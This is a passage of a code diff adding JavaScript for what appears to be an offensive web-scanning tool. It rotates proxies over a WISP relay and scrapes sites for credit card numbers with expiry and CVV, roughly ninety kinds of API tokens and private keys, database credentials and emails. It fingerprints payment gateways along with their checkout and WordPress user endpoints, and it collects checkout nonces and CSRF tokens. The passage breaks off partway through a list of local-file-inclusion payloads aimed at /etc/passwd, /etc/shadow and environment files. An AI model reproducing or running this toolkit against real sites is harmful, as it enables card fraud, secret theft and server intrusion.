+  if (badge) { badge.className = 'proxy-badge ' + cls; badge.textContent = text; }
+}
+function setWispDot(s) { const d = document.getElementById('wispDot'); if (d) d.className = 'wisp-dot ' + s; }
+
+function wispProxyRequest(wc, proxyHost, proxyPort, rawRequest, timeout) {
+  return new Promise((res, rej) => {
+    if (!wc || !wc.ready) { rej(new Error('WISP not ready')); return; }
+    const sid = wc.streamCounter++;
+    const hb = new TextEncoder().encode(proxyHost), cb = new Uint8Array(3 + hb.length);
+    cb[0] = 0x01; new DataView(cb.buffer).setUint16(1, proxyPort, true); cb.set(hb, 3);
+    wc._send(WISP_CONNECT, sid, cb);
+    wc._send(WISP_DATA, sid, new TextEncoder().encode(rawRequest));
+    const st = { chunks: [], reject: rej, _timer: setTimeout(() => { wc.streams.delete(sid); wc._send(WISP_CLOSE, sid, new Uint8Array([1])); rej(new Error('proxy timeout')); }, timeout) };
+    st._check = function () {
+      const tot = this.chunks.reduce((a, c) => a + c.length, 0);
+      const joined = new Uint8Array(tot); let o = 0;
+      for (const c of this.chunks) { joined.set(c, o); o += c.length; }
+      const txt = new TextDecoder('utf-8', { fatal: false }).decode(joined);
+      const sep = txt.indexOf('\r\n\r\n'); if (sep === -1) return;
+      const cl = (txt.slice(0, sep).match(/content-length:\s*(\d+)/i) || [])[1];
+      if (cl !== undefined && txt.slice(sep + 4).length >= parseInt(cl)) this._fin();
+      else if (cl === undefined && txt.slice(sep + 4).length > 0) this._fin();
+    }.bind(st);
+    st._fin = function () {
+      clearTimeout(this._timer); wc.streams.delete(this._sid);
+      const tot = this.chunks.reduce((a, c) => a + c.length, 0);
+      const joined = new Uint8Array(tot); let o = 0;
+      for (const c of this.chunks) { joined.set(c, o); o += c.length; }
+      const txt = new TextDecoder('utf-8', { fatal: false }).decode(joined);
+      const sep = txt.indexOf('\r\n\r\n');
+      if (sep === -1) { res({ status: 0, headers: {}, text: txt, ok: false }); return; }
+      const hl = txt.slice(0, sep).split('\r\n');
+      const sc = parseInt(((hl[0] || '').match(/\s(\d{3})\s/) || [, '0'])[1]) || 0;
+      const hd = {};
+      for (const l of hl.slice(1)) { const ci = l.indexOf(':'); if (ci > -1) hd[l.slice(0, ci).trim().toLowerCase()] = l.slice(ci + 1).trim(); }
+      res({ status: sc, headers: hd, text: txt.slice(sep + 4), ok: sc >= 200 && sc < 400 });
+    }.bind(st);
+    st._sid = sid; st._wisp = wc;
+    wc.streams.set(sid, st);
+  });
+}
+function buildProxyRequest(method, targetUrl, extraHeaders) {
+  const p = new URL(targetUrl);
+  return [method + ' ' + targetUrl + ' HTTP/1.1', 'Host: ' + p.hostname, 'Connection: close', 'Proxy-Connection: close'].concat(Object.entries(extraHeaders).map(([k, v]) => k + ': ' + v), ['', '']).join('\r\n');
+}
+async function ensureWisp() {
+  const wispUrl = getSetting('wispUrl', '');
+  if (!wispUrl) throw new Error('No WISP server configured');
+  if (!wispClient || !wispClient.ready) { wispClient = new WISPClient(wispUrl); await wispClient.connect(); setWispDot('connected'); }
+  return wispClient;
+}
+async function checkOneProxy(proxyUrl, timeout) {
+  let wc; try { wc = await ensureWisp(); } catch { return false; }
+  const p = new URL(proxyUrl);
+  const req = buildProxyRequest('GET', 'https://wtfismyip.com/json', { 'User-Agent': getUA(), 'Accept': 'application/json' });
+  try {
+    const r = await wispProxyRequest(wc, p.hostname, p.port ? parseInt(p.port) : 80, req, timeout);
+    if (r.text.includes('YourFuckingIPAddress')) { const m = r.text.match(/"YourFuckingIPAddress"\s*:\s*"([^"]+)"/); return m ? m[1] : true; }
+    return false;
+  } catch { return false; }
+}
+async function loadAndCheckProxies(lines) {
+  if (proxyChecking) return;
+  const wispUrl = getSetting('wispUrl', '');
+  if (!wispUrl) { toast('Set a WISP URL in Settings first'); return; }
+  proxyChecking = true;
+  const btn = document.getElementById('btnLoadProxies'), chk = document.getElementById('proxyEnabled');
+  if (btn) btn.disabled = true; if (chk) chk.disabled = true;
+  proxyList = []; proxyIndex = 0;
+  setProxyStatus('checking', 'loading');
+  try { await ensureWisp(); } catch (e) {
+    setProxyStatus('none', 'WISP failed');
+    tlog('moduleLog', 'x', '[Proxy] WISP failed: ' + e.message, 'bad');
+    if (btn) btn.disabled = false; proxyChecking = false; return;
+  }
+  let rawLines = lines;
+  if (!rawLines) {
+    const listUrl = getSetting('proxyListUrl', '');
+    let raw = '';
+    try { raw = await fetch(listUrl).then(r => r.text()); } catch {
+      setProxyStatus('none', 'list fetch failed');
+      if (btn) btn.disabled = false; proxyChecking = false; return;
+    }
+    rawLines = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.startsWith('http'));
+  }
+  if (!rawLines.length) { setProxyStatus('none', 'empty list'); if (btn) btn.disabled = false; proxyChecking = false; return; }
+  setProxyStatus('checking', 'validating 0/' + rawLines.length);
+  tlog('moduleLog', '.', '[Proxy] Validating ' + rawLines.length + ' proxies', 'proxy');
+  const PT = 8000, PC = 8;
+  let aliveCount = 0;
+  for (let i = 0; i < rawLines.length; i += PC) {
+    const batch = rawLines.slice(i, i + PC);
+    const results = await Promise.all(batch.map(async pUrl => {
+      try { const ip = await checkOneProxy(pUrl, PT); if (ip) tlog('moduleLog', '+', '[Proxy] ' + pUrl + ' -> ' + ip, 'hit'); return { url: pUrl, alive: !!ip, ip: ip || '' }; }
+      catch { return { url: pUrl, alive: false, ip: '' }; }
+    }));
+    for (const r of results) { proxyList.push(r); if (r.alive) aliveCount++; }
+    setProxyStatus('checking', 'checked ' + Math.min(i + PC, rawLines.length) + '/' + rawLines.length + ' (' + aliveCount + ' alive)');
+  }
+  const working = proxyList.filter(p => p.alive);
+  if (working.length > 0) {
+    setProxyStatus('ready', working.length + ' ready');
+    tlog('moduleLog', '+', '[Proxy] ' + working.length + '/' + rawLines.length + ' verified', 'hit');
+    if (chk) { chk.disabled = false; chk.checked = true; }
+  } else {
+    setProxyStatus('none', '0 alive');
+    tlog('moduleLog', '!', '[Proxy] No working proxies', 'warn');
+    if (chk) chk.disabled = true;
+  }
+  if (btn) btn.disabled = false;
+  proxyChecking = false;
+}
+function nextProxy() {
+  const working = proxyList.filter(p => p.alive);
+  if (!working.length) return null;
+  const p = working[proxyIndex % working.length];
+  proxyIndex = (proxyIndex + 1) % working.length;
+  return p;
+}
+
+/* ===== httpMod ===== */
+let modAbortController = new AbortController();
+async function httpMod(url, extra = {}) {
+  const timeout = getTimeout();
+  const headers = Object.assign({ 'User-Agent': getUA() }, getExtraHdrs(), extra.headers || {});
+  const method = extra.method || 'GET';
+  const useProxy = !!(document.getElementById('proxyEnabled') && document.getElementById('proxyEnabled').checked);
+  if (useProxy) {
+    const proxy = nextProxy();
+    if (proxy) {
+      let wc; try { wc = await ensureWisp(); } catch {}
+      if (wc) {
+        try {
+          const pUrl = new URL(proxy.url);
+          const req = buildProxyRequest(method, url, headers);
+          return await wispProxyRequest(wc, pUrl.hostname, pUrl.port ? parseInt(pUrl.port) : 80, req, timeout);
+        } catch (e) {
+          if (e.name === 'AbortError') throw e;
+          proxy.alive = false;
+          const still = proxyList.filter(p => p.alive).length;
+          setProxyStatus(still > 0 ? 'ready' : 'none', still > 0 ? still + ' proxies ready' : '0 alive');
+        }
+      }
+    }
+  }
+  try {
+    const init = { method, headers, signal: modAbortController.signal, mode: 'cors', credentials: 'omit', redirect: 'follow' };
+    if (extra.body !== undefined) init.body = extra.body;
+    const resp = await Promise.race([fetch(url, init), new Promise((_, r) => setTimeout(() => r(new Error('timeout')), timeout))]);
+    const text = await resp.text();
+    const hd = {}; resp.headers.forEach((v, k) => { hd[k.toLowerCase()] = v; });
+    return { status: resp.status, headers: hd, text, ok: resp.ok, redirected: resp.redirected, finalUrl: resp.url };
+  } catch (e) {
+    if (e.name === 'AbortError') throw e;
+    const wispUrl = getSetting('wispUrl', '');
+    if (wispUrl) {
+      if (!wispClient || !wispClient.ready) {
+        wispClient = new WISPClient(wispUrl);
+        try { await wispClient.connect(); setWispDot('connected'); } catch (we) { setWispDot('error'); throw new Error('WISP failed: ' + we.message); }
+      }
+      return await wispClient.request(method, url, headers, timeout);
+    }
+    throw e;
+  }
+}
+async function concurrentBatch(items, fn, conc) {
+  for (let i = 0; i < items.length; i += conc) {
+    modCheckAbort();
+    await Promise.all(items.slice(i, i + conc).map(async item => {
+      try { await fn(item); } catch (e) { if (e.name === 'AbortError') throw e; }
+    }));
+  }
+}
+
+/* ===== SCANNER FILTERS ===== */
+const PLACE = ['example','placeholder','changeme','change_me','change-me','your_','your-','my_','my-','insert_','insert-','test_key','test-key','testkey','dummy','sample','sample-','xxxxx','aaaaa','foobar','foo_bar','foo-bar','redacted','fake_','fake-','<your','todo:','fixme','apikeyhere','secrethere','tokenhere','passwordhere'];
+const hasPH = s => { const l = s.toLowerCase(); return PLACE.some(t => l.includes(t)); };
+const dchars = s => new Set(s).size;
+const BAD = new Set(['undefined','null','true','false','nan','none','test','example','localhost','password','secret','token','apikey','api_key','api-key','your_api_key','your-key','changeme','change_me','yoursecret','yourtoken','placeholder','value','string','number','object','array','function','error','success','failed','active','enabled','disabled','default','production','development','staging','something','anything','whatever','webhook','bearer','basic','content-type','application','text/plain','utf-8','gzip','username','csrf','nonce','wpnonce','request','response','header','footer','script','style','body','html','document','window','element','selector']);
+function garbage(v) {
+  if (!v) return true;
+  const t = String(v).trim();
+  if (!t || BAD.has(t.toLowerCase())) return true;
+  if (t.length >= 8 && new Set(t).size <= 2) return true;
+  if (/\s/.test(t) || /[<>]/.test(t) || /^[./~]/.test(t)) return true;
+  if (/^[a-f0-9]{1,31}$/i.test(t) || /^\d+$/.test(t)) return true;
+  return false;
+}
+
+/* ===== CREDIT CARDS ===== */
+const MONTH_MAP = { Jan:1,Feb:2,Mar:3,Apr:4,May:5,Jun:6,Jul:7,Aug:8,Sep:9,Oct:10,Nov:11,Dec:12 };
+const CARD_RULES = [
+  { r: /(\d{13,19})\s*[,;|]\s*(\d{1,2})[/\\|](\d{2,4})\s*[,;|]\s*(\d{3,4})/g, o: [1,2,3,4] },
+  { r: /(?:card|cc|number|pan)\s*[:=\s]+\s*(\d{13,19})\s*(?:exp|date|expiry)\s*[:=\s]+\s*(\d{1,2})[/\\|.-](\d{2,4})\s*(?:cvv|cvc|cv2|cid)\s*[:=\s]+\s*(\d{3,4})/gi, o:[1,2,3,4] },
+  { r: /\b(\d{13,19})[|,\s]+(\d{1,2})[|,\s]+(\d{2,4})[|,\s]+(\d{3,4})\b/g, o:[1,2,3,4] },
+  { r: /\b(\d{13,19})[|](\d{3,4})[|](\d{1,2})[|](\d{2,4})\b/g, o:[1,3,4,2] },
+  { r: /(\d{13,19})\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*(\d{3,4})/g, o:[1,2,3,4] },
+  { r: /(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{1,2})\s*(\d{2,4})\s*(\d{3,4})/g, c:[1,2,3,4], o:[5,6,7] },
+  { r: /(\d{13,19})\s*(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s*(\d{2,4})\s*(\d{3,4})/gi, monthName:true, o:[1,2,3,4] }
+];
+
+/* ===== SECRETS ===== */
+const SECRETS = [
+  ['OpenAI API Key', /(?<![A-Za-z0-9_-])(sk-[a-zA-Z0-9]{20}T3BlbkFJ[a-zA-Z0-9]{20})(?![A-Za-z0-9_-])/g],
+  ['OpenAI Project Key', /(?<![A-Za-z0-9_-])(sk-proj-[a-zA-Z0-9_-]{80,200})(?![A-Za-z0-9_-])/g],
+  ['OpenAI Service Key', /(?<![A-Za-z0-9_-])(sk-svcacct-[a-zA-Z0-9_-]{80,200})(?![A-Za-z0-9_-])/g],
+  ['OpenAI Legacy', /\b(sk-[a-zA-Z0-9]{32,60})\b/g, { minLen:35, minDistinct:15, notStart:['sk-proj-','sk-svcacct-'] }],
+  ['Anthropic Key', /(?<![A-Za-z0-9_-])(sk-ant-api[0-9]{2}-[a-zA-Z0-9_-]{80,140})(?![A-Za-z0-9_-])/g],
+  ['Anthropic Admin', /(?<![A-Za-z0-9_-])(sk-ant-admin[0-9]{2}-[a-zA-Z0-9_-]{80,140})(?![A-Za-z0-9_-])/g],
+  ['OpenRouter', /(?<![A-Za-z0-9_-])(sk-or-v1-[a-f0-9]{64})(?![A-Za-z0-9_-])/g],
+  ['Groq Key', /(?<![A-Za-z0-9_-])(gsk_[a-zA-Z0-9]{48,60})(?![A-Za-z0-9_-])/g],
+  ['Perplexity Key', /(?<![A-Za-z0-9_-])(pplx-[a-f0-9]{40,64})(?![A-Za-z0-9_-])/g],
+  ['Replicate Token', /(?<![A-Za-z0-9_-])(r8_[a-zA-Z0-9]{36,40})(?![A-Za-z0-9_-])/g],
+  ['HuggingFace Token', /(?<![A-Za-z0-9_-])(hf_[a-zA-Z0-9]{30,42})(?![A-Za-z0-9_-])/g],
+  ['HuggingFace Org', /(?<![A-Za-z0-9_-])(api_org_[a-zA-Z0-9]{30,40})(?![A-Za-z0-9_-])/g],
+  ['xAI Key', /(?<![A-Za-z0-9_-])(xai-[a-zA-Z0-9]{80,90})(?![A-Za-z0-9_-])/g],
+  ['Voyage Key', /\b(pa-[a-zA-Z0-9_-]{40,60})\b/g],
+  ['Fireworks Key', /\b(fw_[a-zA-Z0-9]{24,})\b/g],
+  ['LangSmith', /\b(lsv2_[a-zA-Z0-9_-]{32,})\b/g],
+  ['GitHub PAT', /(?<![A-Za-z0-9_-])(ghp_[a-zA-Z0-9]{36})(?![A-Za-z0-9_-])/g],
+  ['GitHub Fine PAT', /(?<![A-Za-z0-9_-])(github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})(?![A-Za-z0-9_-])/g],
+  ['GitHub OAuth', /(?<![A-Za-z0-9_-])(gho_[a-zA-Z0-9]{36})(?![A-Za-z0-9_-])/g],
+  ['GitHub U2S', /(?<![A-Za-z0-9_-])(ghu_[a-zA-Z0-9]{36})(?![A-Za-z0-9_-])/g],
+  ['GitHub S2S', /(?<![A-Za-z0-9_-])(ghs_[a-zA-Z0-9]{36})(?![A-Za-z0-9_-])/g],
+  ['GitHub Refresh', /(?<![A-Za-z0-9_-])(ghr_[a-zA-Z0-9]{36})(?![A-Za-z0-9_-])/g],
+  ['GitHub App', /\b(v1\.[0-9a-f]{40})\b/g],
+  ['GitLab PAT', /(?<![A-Za-z0-9_-])(glpat-[a-zA-Z0-9_-]{20,})(?![A-Za-z0-9_-])/g],
+  ['GitLab Pipeline', /(?<![A-Za-z0-9_-])(glptt-[a-zA-Z0-9_-]{20,})(?![A-Za-z0-9_-])/g],
+  ['GitLab Runner', /(?<![A-Za-z0-9_-])(glrt-[a-zA-Z0-9_-]{20,})(?![A-Za-z0-9_-])/g],
+  ['AWS Access Key', /(?<![A-Z0-9])((?:AKIA|AROA|AIDA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})(?![A-Z0-9])/g],
+  ['AWS Secret Key', /(?<![A-Za-z0-9/+=])([A-Za-z0-9/+=]{40})(?![A-Za-z0-9/+=])/g, { minDistinct:20, requireChars:['/','+','='] }],
+  ['Google API Key', /(?<![A-Za-z0-9_-])(AIza[A-Za-z0-9_-]{35,39})(?![A-Za-z0-9_-])/g],
+  ['Google OAuth', /(?<![A-Za-z0-9])(ya29\.[A-Za-z0-9_-]{50,})(?![A-Za-z0-9])/g],
+  ['Google Refresh', /\b(1\/\/[0-9A-Za-z_-]{40,})\b/g, { minDistinct:15 }],
+  ['GCP SA Key', /"private_key"\s*:\s*"(-----BEGIN (?:RSA )?PRIVATE KEY-----[\s\S]+?-----END (?:RSA )?PRIVATE KEY-----)"/g],
+  ['Azure Secret', /(?<![A-Za-z0-9~._-])([a-zA-Z0-9~._-]{3}8Q~[a-zA-Z0-9._~-]{34})(?![A-Za-z0-9~._-])/g, { minDistinct:20 }],
+  ['Azure SAS', /(sv=\d{4}-\d{2}-\d{2}&[a-zA-Z0-9%&=_.-]{20,})/g, { requireSub:['sig='] }],
+  ['Stripe Live', /(?<![A-Za-z0-9_-])(sk_live_[0-9a-zA-Z]{24,100})(?![A-Za-z0-9_-])/g],
+  ['Stripe Test', /(?<![A-Za-z0-9_-])(sk_test_[0-9a-zA-Z]{24,100})(?![A-Za-z0-9_-])/g],
+  ['Stripe Live PK', /(?<![A-Za-z0-9_-])(pk_live_[0-9a-zA-Z]{24,100})(?![A-Za-z0-9_-])/g],
+  ['Stripe Test PK', /(?<![A-Za-z0-9_-])(pk_test_[0-9a-zA-Z]{24,100})(?![A-Za-z0-9_-])/g],
+  ['Stripe Restricted', /(?<![A-Za-z0-9_-])(rk_live_[0-9a-zA-Z]{24,100})(?![A-Za-z0-9_-])/g],
+  ['Stripe Connect', /(?<![A-Za-z0-9_-])(sk_connect_[0-9a-zA-Z]{24,100})(?![A-Za-z0-9_-])/g],
+  ['Stripe Webhook', /(?<![A-Za-z0-9_-])(whsec_[a-zA-Z0-9]{16,64})(?![A-Za-z0-9_-])/g],
+  ['PayPal Braintree', /\b(access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32})\b/g],
+  ['Braintree Key', /(?:private_key|merchant_id|public_key)\s*[:=]\s*["']?([a-zA-Z0-9]{32,40})["']?/g, { minDistinct:20 }],
+  ['Square Access', /\b(sq0atp-[A-Za-z0-9_-]{22,})\b/g],
+  ['Square OAuth', /\b(sq0csp-[A-Za-z0-9_-]{40,})\b/g],
+  ['Square App ID', /\b(sq0idp-[A-Za-z0-9_-]{20,})\b/g],
+  ['Paddle Live', /\b(pdl_live_[a-zA-Z0-9]{40,})\b/g],
+  ['Paddle Sandbox', /\b(pdl_sdbx_[a-zA-Z0-9]{40,})\b/g],
+  ['Adyen Key', /\b(live_[0-9a-zA-Z]{32,}_[0-9a-zA-Z]{6,})\b/g, { minDistinct:20 }],
+  ['Adyen HMAC', /(?:adyen)[^a-z0-9]{0,30}hmac[^a-z0-9]{0,10}["']?([a-fA-F0-9]{32,64})["']?/gi, { minDistinct:15 }],
+  ['Mollie Live', /\b(live_[a-zA-Z0-9]{30,40})\b/g, { minDistinct:15 }],
+  ['Mollie Test', /\b(test_[a-zA-Z0-9]{30,40})\b/g, { minDistinct:15 }],
+  ['Razorpay', /(?<![A-Za-z0-9_-])(rzp_(?:live|test)_[a-zA-Z0-9]{14,})(?![A-Za-z0-9_-])/g],
+  ['Plaid Client ID', /(?:plaid)[^a-z0-9]{0,20}client[^a-z0-9]{0,5}id[^a-z0-9]{0,10}["']?([a-f0-9]{24})["']?/gi, { minDistinct:12 }],
+  ['Plaid Secret', /(?:plaid)[^a-z0-9]{0,20}secret[^a-z0-9]{0,10}["']?([a-f0-9]{30})["']?/gi, { minDistinct:12 }],
+  ['WooCommerce Key', /\b(ck_[a-fA-F0-9]{40,64})\b/g],
+  ['WooCommerce Secret', /\b(cs_[a-fA-F0-9]{40,64})\b/g],
+  ['Shopify Access', /(?<![A-Za-z0-9_-])(shpat_[a-fA-F0-9]{32})(?![A-Za-z0-9_-])/g],
+  ['Shopify Custom', /(?<![A-Za-z0-9_-])(shpca_[a-fA-F0-9]{32})(?![A-Za-z0-9_-])/g],
+  ['Shopify Private', /(?<![A-Za-z0-9_-])(shppa_[a-fA-F0-9]{32})(?![A-Za-z0-9_-])/g],
+  ['Shopify Secret', /(?<![A-Za-z0-9_-])(shpss_[a-fA-F0-9]{32})(?![A-Za-z0-9_-])/g],
+  ['Slack Bot', /(?<![A-Za-z0-9_-])(xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,})(?![A-Za-z0-9_-])/g],
+  ['Slack User', /(?<![A-Za-z0-9_-])(xoxp-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,})(?![A-Za-z0-9_-])/g],
+  ['Slack App', /(?<![A-Za-z0-9_-])(xapp-[0-9]-[A-Za-z0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]{60,})(?![A-Za-z0-9_-])/g],
+  ['Slack Webhook', /(https:\/\/hooks\.slack\.com\/services\/T[a-zA-Z0-9_]{8,}\/B[a-zA-Z0-9_]{8,}\/[a-zA-Z0-9_]{24,})/g],
+  ['Twilio Key', /(?<![A-Za-z0-9])(SK[a-f0-9]{32})(?![A-Za-z0-9])/g],
+  ['Twilio SID', /(?<![A-Za-z0-9])(AC[a-f0-9]{32})(?![A-Za-z0-9])/g],
+  ['SendGrid', /(?<![A-Za-z0-9_.-])(SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43})(?![A-Za-z0-9_.-])/g],
+  ['Mailgun Key', /(?<![A-Za-z0-9_-])(key-[a-f0-9]{32})(?![A-Za-z0-9_-])/g],
+  ['Mailchimp', /(?<![A-Za-z0-9])([0-9a-f]{32}-us\d{1,2})(?![A-Za-z0-9-])/g],
+  ['Discord Bot', /(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38})(?![A-Za-z0-9_-])/g, { minDistinct:15 }],
+  ['Discord Webhook', /(https:\/\/discord(?:app)?\.com\/api\/webhooks\/\d{17,20}\/[A-Za-z0-9_-]{60,80})/g],
+  ['Telegram Bot', /(?<!\w)(\d{8,10}:[A-Za-z0-9_-]{35})(?![A-Za-z0-9_-])/g],
+  ['Facebook Token', /(?<![A-Za-z0-9])(EAA[A-Za-z0-9]{40,})(?![A-Za-z0-9])/g, { minLen:50 }],
+  ['Twitter Bearer', /(?<![A-Za-z0-9])(AAAAAAAAAAAAAAAAAAAAAA[A-Za-z0-9%+/]{50,})(?![A-Za-z0-9%+/])/g],
+  ['NPM Token', /(?<![A-Za-z0-9_-])(npm_[a-zA-Z0-9]{36})(?![A-Za-z0-9_-])/g],
+  ['PyPI Token', /(?<![A-Za-z0-9_-])(pypi-[A-Za-z0-9_-]{50,})(?![A-Za-z0-9_-])/g],
+  ['Doppler', /(?<![A-Za-z0-9._-])(dp\.st\.[a-zA-Z0-9_-]{40,})(?![A-Za-z0-9._-])/g],
+  ['Vault Token', /(?<![A-Za-z0-9._-])(hvs\.[A-Za-z0-9_-]{24,})(?![A-Za-z0-9._-])/g],
+  ['Supabase Key', /(?<![A-Za-z0-9_-])(eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{43,})(?![A-Za-z0-9_-])/g, { minDistinct:20 }],
+  ['DigitalOcean PAT', /(?<![A-Za-z0-9_-])(dop_v1_[a-f0-9]{64})(?![A-Za-z0-9_-])/g],
+  ['Sentry DSN', /(https?:\/\/[a-f0-9]{32}@(?:o\d+\.)?(?:[a-z0-9-]+\.)?sentry\.io\/\d+)/g],
+  ['Sentry Auth', /(?<![A-Za-z0-9_-])(sntrys_[A-Za-z0-9_-]{40,})(?![A-Za-z0-9_-])/g],
+  ['PostHog API', /(?<![A-Za-z0-9_-])(phc_[a-zA-Z0-9]{40,})(?![A-Za-z0-9_-])/g],
+  ['HubSpot PAT', /(?<![A-Za-z0-9_-])(pat-(?:na|eu)1-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})(?![A-Za-z0-9_-])/g],
+  ['Mapbox Token', /(?<![A-Za-z0-9])(pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_-]{20,})(?![A-Za-z0-9])/g],
+  ['Cloudinary URL', /(cloudinary:\/\/[0-9]{10,}:[A-Za-z0-9_-]{20,}@[a-z0-9-]+)/g],
+  ['EVM Bare Key', /(?<![A-Za-z0-9])(0x[0-9a-fA-F]{64})(?![A-Za-z0-9])/g, { minDistinct:10 }],
+  ['SSH Priv Key', /(-----BEGIN (?:RSA |OPENSSH |EC |ED25519 |DSA )?PRIVATE KEY-----[\s\S]+?-----END (?:RSA |OPENSSH |EC |ED25519 |DSA )?PRIVATE KEY-----)/g],
+  ['PGP Priv Key', /(-----BEGIN PGP PRIVATE KEY BLOCK-----[\s\S]+?-----END PGP PRIVATE KEY BLOCK-----)/g],
+  ['PostgreSQL URI', /(postgres(?:ql)?:\/\/[^\s<>"']{10,})/g, { requireSub:['@'] }],
+  ['MySQL URI', /(mysql(?:2)?:\/\/[^\s<>"']{10,})/g, { requireSub:['@'] }],
+  ['MongoDB URI', /(mongodb(?:\+srv)?:\/\/[^\s<>"']{10,})/g, { requireSub:['@'] }],
+  ['Redis URI', /(rediss?:\/\/[^\s<>"']{10,})/g, { requireSub:['@'] }],
+  ['JWT', /(?<![A-Za-z0-9_-])(eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})(?![A-Za-z0-9_-])/g, { minDistinct:20 }],
+  ['Generic Secret', /(?:secret|token|credential|password|passwd|pwd)\s*[:=]\s*["']([^"']{24,256})["']/gi, { minDistinct:15, notStart:['{','$','%'] }],
+  ['Generic API Key', /(?:api[_-]?key|apikey|api[_-]?secret|client[_-]?secret)\s*[:=]\s*["']([^"']{24,256})["']/gi, { minDistinct:15, notStart:['{','$','%'] }],
+  ['Bearer Token', /(?:bearer|authorization)\s*[:=]\s*["']?(?:Bearer\s+)?([a-zA-Z0-9._~+/=-]{32,})["']?/gi, { minDistinct:20 }],
+  ['Email', /\b([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\b/g, { notEnd:['@example.com','@test.com'] }]
+];
+
+/* ===== GATEWAYS ===== */
+const GATEWAY_SIGNATURES = {
+  Stripe: { re: /js\.stripe\.com|stripe-js|pk_live_[A-Za-z0-9]+|pk_test_[A-Za-z0-9]+|Stripe\s*\(\s*['"]pk_|stripe\.confirmCardPayment|createAndConfirmSetupIntentNonce|stripe_publishable_key|wc[-_]stripe/i, keys: [['Stripe Publishable', /\b(pk_(?:live|test)_[A-Za-z0-9]{24,100})\b/g]] },
+  Braintree: { re: /js\.braintreegateway\.com|braintree[-_]?web|BraintreeDropin|"clientToken"|braintree-hosted-field/i, keys: [['Braintree Client Token', /"clientToken"\s*:\s*"([A-Za-z0-9+/=_-]{40,})"/g]] },
+  Adyen: { re: /checkoutshopper-live\.adyen\.com|adyen-web|"clientKey":\s*"(?:live|test)_/i, keys: [['Adyen Client Key', /"clientKey"\s*:\s*"((?:live|test)_[A-Za-z0-9]{32,})"/g]] },
+  PayPal: { re: /paypal\.com\/sdk\/js|paypalobjects\.com|paypal\.Buttons|PAYPAL_CLIENT_ID/i, keys: [['PayPal Client ID', /data-client-id=["']([A-Za-z0-9_-]{20,})["']/g]] },
+  WooCommerce: { re: /woocommerce|wc[-_]checkout|wc-ajax=checkout|wc_checkout_params/i, keys: [] },
+  WordPress: { re: /\/wp-includes\/|\/wp-content\/|wp-json|wp-admin|_wpnonce/i, keys: [] },
+  Square: { re: /squareup\.com|web\.squarecdn\.com|sq0idp-/i, keys: [['Square App ID', /\b(sq0idp-[A-Za-z0-9_-]{20,})\b/g]] },
+  ShopifyPayments: { re: /cdn\.shopify\.com|Shopify\.PaymentButton/i, keys: [['Shopify Access Token', /\b(shpat_[a-fA-F0-9]{32})\b/g]] }
+};
+const GATEWAY_ENDPOINTS = {
+  Stripe: ['/?wc-ajax=checkout', '/wp-admin/admin-ajax.php', '/checkout/', '/my-account/add-payment-method/'],
+  Braintree: ['/?wc-ajax=checkout', '/checkout/'],
+  Adyen: ['/checkout/', '/api/sessions', '/api/payments'],
+  PayPal: ['/checkout/', '/?wc-ajax=checkout'],
+  WooCommerce: ['/?wc-ajax=checkout', '/?wc-ajax=update_order_review', '/wp-admin/admin-ajax.php', '/wp-json/', '/wp-json/wc/v3/payment_gateways', '/checkout/', '/cart/'],
+  WordPress: ['/wp-json/', '/wp-json/wp/v2/users', '/wp-login.php', '/wp-admin/admin-ajax.php'],
+  Square: ['/checkout/'],
+  ShopifyPayments: ['/cart.json', '/products.json']
+};
+
+/* ===== NONCES ===== */
+const NONCE_PATTERNS = [
+  ['WC Checkout Nonce', [/name=["']woocommerce-process-checkout-nonce["'][^>]*value=["']([^"']+)["']/g]],
+  ['WP Nonce', [/_wpnonce["']?\s*(?::|value=)\s*["']([a-f0-9]+)["']/g, /"nonce"\s*:\s*["']([a-f0-9]{8,12})["']/g]],
+  ['CSRF Token', [/name=["']csrf[-_]token["'][^>]*value=["']([^"']+)["']/g, /"csrfToken"\s*:\s*"([^"]+)"/g]],
+  ['Braintree Token', [/"clientToken"\s*:\s*"([^"]+)"/g]],
+  ['Adyen Client Key', [/"clientKey"\s*:\s*"((?:live|test)_[A-Za-z0-9]+)"/g]]
+];
+
+/* ===== PAYLOADS ===== */
+const LFI_SIGNS = ['root:x:0:0','bin/bash','bin/sh','daemon:','[boot loader]','[extensions]','for 16-bit','www-data','nobody:','sshd:','nologin'];
+const LFI = [
+  '../../../../../etc/passwd','/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd','..%2F..%2F..%2F..%2F..%2Fetc/passwd',
+  '/etc/passwd','/etc/shadow','/etc/hosts','/etc/hostname','/proc/self/environ','/proc/self/cmdline','/proc/version',
+  '%00/etc/passwd','%00../../../../../../etc/passwd','/../../../../../../../../../../etc/passwd',
+  '../../etc/passwd','../etc/passwd','etc/passwd','/etc/passwd%00','/etc/passwd%00.html','/etc/passwd%00.php',
+  '....//....//....//etc/passwd','....//etc/passwd','..2fetc2fpasswd','..2f..2f..2f..2f..2fetc2fpasswd',
+  '/windows/win.ini','\\windows\\win.ini','../../../../windows/win.ini','..\\..\\..\\windows\\win.ini',
+  'C:\\windows\\win.ini','C:/windows/win.ini','C:\\boot.ini','C:/boot.ini',
+  'php://filter/convert.base64-encode/resource=/etc/passwd','php://filter/read=convert.base64-encode/resource=/etc/passwd',
